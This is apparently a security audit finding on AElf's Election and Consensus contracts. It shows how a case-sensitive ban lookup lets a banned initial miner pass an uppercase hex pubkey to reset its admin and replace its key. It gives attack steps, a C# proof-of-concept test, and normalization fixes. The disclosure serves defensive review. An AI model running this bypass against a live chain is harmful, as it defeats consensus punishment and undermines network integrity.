# Audit Report

## Title
Case-Sensitive Pubkey Comparison Allows Banned Initial Miners to Bypass Ban and Replace Their Public Key

## Summary
The Election contract's ban system can be bypassed by banned initial miners using case-variant hex strings. The `IsPubkeyBanned()` function performs case-sensitive dictionary lookups, but the consensus contract stores banned pubkeys in lowercase format using `ToHex()`. This allows a banned initial miner to use uppercase hex variants of their pubkey to pass ban checks in `SetCandidateAdmin` and `ReplaceCandidatePubkey`, enabling them to replace their banned pubkey with a new one and continue participating in consensus.

## Finding Description

The root cause is a case-sensitivity mismatch in pubkey handling across the Election and Consensus contracts.

**The ToHex() method produces lowercase hex strings:** [1](#0-0) 

The formula at lines 38 and 41 uses `b + 0x37 + 0x20` where `0x20` (32 in decimal) converts uppercase hex characters ('A'-'F' = 65-70) to lowercase ('a'-'f' = 97-102).

**Consensus round generation uses ToHex():** [2](#0-1) [3](#0-2) 

Pubkeys are converted to lowercase hex strings and stored in `minerInRound.Pubkey`.

**Evil miners are banned with lowercase pubkeys:** [4](#0-3) 

The consensus contract detects evil miners and sends `UpdateCandidateInformation` with lowercase pubkey strings from `evilMiner`.

**The ban is stored with the provided (lowercase) pubkey:** [5](#0-4) 

**IsPubkeyBanned performs case-sensitive dictionary lookup:** [6](#0-5) 

C# dictionary string key lookups are case-sensitive, so `BannedPubkeyMap["abc123"]` and `BannedPubkeyMap["ABC123"]` are different entries.

**SetCandidateAdmin has mismatched checks:** [7](#0-6) [8](#0-7) 

Line 23 performs case-sensitive ban check, but line 32 uses `HexStringToByteArray` for permission validation.

**HexStringToByteArray is case-insensitive:** [9](#0-8) 

`Convert.ToByte(hex.Substring(i, 2), 16)` accepts both uppercase and lowercase hex characters, treating "ABC123" and "abc123" as identical bytes.

**IsCurrentCandidateOrInitialMiner also uses case-insensitive conversion:** [10](#0-9) 

**ReplaceCandidatePubkey has the same vulnerability:** [11](#0-10) 

The ban check at line 177 is case-sensitive, while permission and validation checks use case-insensitive byte conversion.

**Attack execution:**
1. Initial miner with pubkey bytes `[0xAB, 0xC1, 0x23, ...]` is banned by consensus as "abc123..."
2. Attacker calls `SetCandidateAdmin(Pubkey="ABC123...", Admin=AttackerAddress)`:
   - `IsPubkeyBanned("ABC123...")` returns false (different key from "abc123...")
   - `IsCurrentCandidateOrInitialMiner("ABC123...")` returns true (bytes match InitialMiners)
   - Permission check passes (bytes match sender's public key)
   - Admin is successfully set
3. Attacker calls `ReplaceCandidatePubkey(OldPubkey="ABC123...", NewPubkey="newkey...")`:
   - `IsPubkeyBanned("ABC123...")` returns false
   - Permission check passes (admin was set in step 2)
   - Replacement succeeds, old pubkey removed from InitialMiners, new pubkey added [12](#0-11) 

The banned evil miner successfully replaces their pubkey and can participate in consensus again.

## Impact Explanation

This vulnerability directly compromises **consensus integrity**, which is a critical security boundary in the blockchain system.

**Consensus Security Violation:**
Evil miners detected and banned by the consensus contract's anti-malicious-behavior mechanism can completely evade permanent exclusion. The system's fundamental guarantee that "once banned, always banned" is broken.

**Consequences:**
- Evil miners who miss excessive time slots can return to consensus participation
- No economic penalty or token cost required (only transaction fees)
- Initial miners have the highest privilege level in consensus; their ability to bypass bans is especially critical
- The consensus contract's `TryToDetectEvilMiners` mechanism becomes ineffective
- Chain security depends on honest majority assumption, which is violated if evil miners can repeatedly return

**Severity Assessment: HIGH** - This breaks a fundamental consensus security invariant. The ability for detected malicious miners to bypass permanent bans undermines the entire evil node detection and punishment mechanism in AEDPoS consensus.

## Likelihood Explanation

**Attacker Prerequisites:**
- Must be an initial miner (set during chain initialization)
- Must control the private key of a banned pubkey
- Must have been detected as evil and banned by the consensus contract

**Attack Complexity: LOW**
- Requires only two straightforward contract calls: `SetCandidateAdmin` then `ReplaceCandidatePubkey`
- No timing constraints or race conditions
- No need for collusion with other miners or compromised system contracts
- The uppercase transformation is trivial (convert "abc" to "ABC")

**Feasibility: HIGH**
- Initial miners exist in every AElf chain deployment
- Evil node detection is an active, documented feature (miners exceeding `TolerableMissedTimeSlotsCount` are automatically banned)
- Banned miners have strong economic incentives (block rewards, consensus influence) to return
- The attack is deterministic and easily reproducible

**Detection Difficulty: HIGH**
- The lowercase ban entry remains in `BannedPubkeyMap`, appearing legitimate
- State changes (admin updates, pubkey replacements) follow normal patterns
- Only careful case-by-case string comparison would reveal the bypass

**Overall Likelihood: HIGH** - Given the low attack complexity, high feasibility, and strong attacker incentives, this vulnerability is highly likely to be exploited by any banned initial miner aware of the case-sensitivity mismatch.

## Recommendation

Normalize all pubkey strings to a canonical format (lowercase) before any comparison or storage operation. Implement the fix in three places:

1. **In `SetCandidateAdmin` and `ReplaceCandidatePubkey`:** Normalize the input pubkey before ban checks:
```csharp
var normalizedPubkey = input.Pubkey.ToLower();
Assert(!IsPubkeyBanned(normalizedPubkey), "Pubkey is already banned.");
```

2. **In `UpdateCandidateInformation`:** Normalize before storing the ban:
```csharp
State.BannedPubkeyMap[input.Pubkey.ToLower()] = true;
```

3. **In `IsPubkeyBanned`:** Normalize before lookup:
```csharp
private bool IsPubkeyBanned(string pubkey)
{
    return State.BannedPubkeyMap[pubkey.ToLower()];
}
```

Alternatively, create a helper method to ensure consistent normalization across all pubkey operations:
```csharp
private string NormalizePubkey(string pubkey)
{
    return pubkey?.ToLower() ?? string.Empty;
}
```

## Proof of Concept

```csharp
[Fact]
public async Task BannedInitialMinerCanBypassBanUsingUppercaseHex()
{
    // Setup: Get an initial miner's info
    var initialMiners = await ElectionContractStub.GetInitialMiners.CallAsync(new Empty());
    var targetMinerBytes = initialMiners.Value[0];
    var lowercasePubkey = targetMinerBytes.ToHex(); // e.g., "abc123..."
    var uppercasePubkey = lowercasePubkey.ToUpper(); // e.g., "ABC123..."
    
    // Step 1: Consensus contract bans the miner (using lowercase from ToHex)
    await ElectionContractStub.UpdateCandidateInformation.SendAsync(new UpdateCandidateInformationInput
    {
        Pubkey = lowercasePubkey,
        IsEvilNode = true
    });
    
    // Verify ban is in place for lowercase
    var isBanned = await ElectionContractStub.IsPubkeyBanned.CallAsync(new StringValue { Value = lowercasePubkey });
    isBanned.Value.ShouldBeTrue();
    
    // Step 2: Attacker uses uppercase variant to bypass ban check and set admin
    var attackerAdmin = Accounts[5].Address;
    var result = await ElectionContractStub.SetCandidateAdmin.SendAsync(new SetCandidateAdminInput
    {
        Pubkey = uppercasePubkey, // Using uppercase bypasses ban!
        Admin = attackerAdmin
    });
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined); // Should fail but succeeds
    
    // Step 3: Attacker replaces banned pubkey with new one
    var newPubkey = GenerateNewPubkey();
    var replaceResult = await ElectionContractStub.ReplaceCandidatePubkey.SendAsync(new ReplaceCandidatePubkeyInput
    {
        OldPubkey = uppercasePubkey,
        NewPubkey = newPubkey
    });
    replaceResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined); // Should fail but succeeds
    
    // Verify: Banned miner successfully replaced pubkey and can participate again
    var newInitialMiners = await ElectionContractStub.GetInitialMiners.CallAsync(new Empty());
    newInitialMiners.Value.ShouldContain(ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(newPubkey)));
    newInitialMiners.Value.ShouldNotContain(targetMinerBytes);
}
```

### Citations

**File:** src/AElf.Types/Extensions/ByteExtensions.cs (L38-41)
```csharp
                c[cx] = (char)(b > 9 ? b + 0x37 + 0x20 : b + 0x30);

                b = (byte)(bytes[bx] & 0x0F);
                c[++cx] = (char)(b > 9 ? b + 0x37 + 0x20 : b + 0x30);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/MinerList.cs (L16-19)
```csharp
            (from obj in Pubkeys
                    .ToDictionary<ByteString, string, int>(miner => miner.ToHex(), miner => miner[0])
                orderby obj.Value descending
                select obj.Key).ToList();
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/MinerList.cs (L30-30)
```csharp
            minerInRound.Pubkey = sortedMiners[i];
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L139-154)
```csharp
        if (State.IsMainChain.Value && // Only detect evil miners in Main Chain.
            currentRound.TryToDetectEvilMiners(out var evilMiners))
        {
            Context.LogDebug(() => "Evil miners detected.");
            foreach (var evilMiner in evilMiners)
            {
                Context.LogDebug(() =>
                    $"Evil miner {evilMiner}, missed time slots: {currentRound.RealTimeMinersInformation[evilMiner].MissedTimeSlots}.");
                // Mark these evil miners.
                State.ElectionContract.UpdateCandidateInformation.Send(new UpdateCandidateInformationInput
                {
                    Pubkey = evilMiner,
                    IsEvilNode = true
                });
            }
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L93-96)
```csharp
        if (input.IsEvilNode)
        {
            var publicKeyByte = ByteArrayHelper.HexStringToByteArray(input.Pubkey);
            State.BannedPubkeyMap[input.Pubkey] = true;
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L175-181)
```csharp
        Assert(IsCurrentCandidateOrInitialMiner(input.OldPubkey),
            "Pubkey is neither a current candidate nor an initial miner.");
        Assert(!IsPubkeyBanned(input.OldPubkey) && !IsPubkeyBanned(input.NewPubkey),
            "Pubkey is in already banned.");

        // Permission check.
        Assert(Context.Sender == GetCandidateAdmin(new StringValue { Value = input.OldPubkey }), "No permission.");
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L220-226)
```csharp
        var initialMiners = State.InitialMiners.Value;
        if (initialMiners.Value.Contains(oldPubkeyBytes))
        {
            initialMiners.Value.Remove(oldPubkeyBytes);
            initialMiners.Value.Add(newPubkeyBytes);
            State.InitialMiners.Value = initialMiners;
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L21-23)
```csharp
        Assert(IsCurrentCandidateOrInitialMiner(input.Pubkey),
            "Pubkey is neither a current candidate nor an initial miner.");
        Assert(!IsPubkeyBanned(input.Pubkey), "Pubkey is already banned.");
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L32-33)
```csharp
                Assert(Context.Sender == Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(input.Pubkey)),
                    "No permission.");
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L61-64)
```csharp
    private bool IsPubkeyBanned(string pubkey)
    {
        return State.BannedPubkeyMap[pubkey];
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L79-80)
```csharp
        var isInitialMiner = State.InitialMiners.Value.Value.Contains(
            ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(pubkey)));
```

**File:** src/AElf.Types/Helper/ByteArrayHelper.cs (L15-16)
```csharp
            for (var i = 0; i < numberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
```
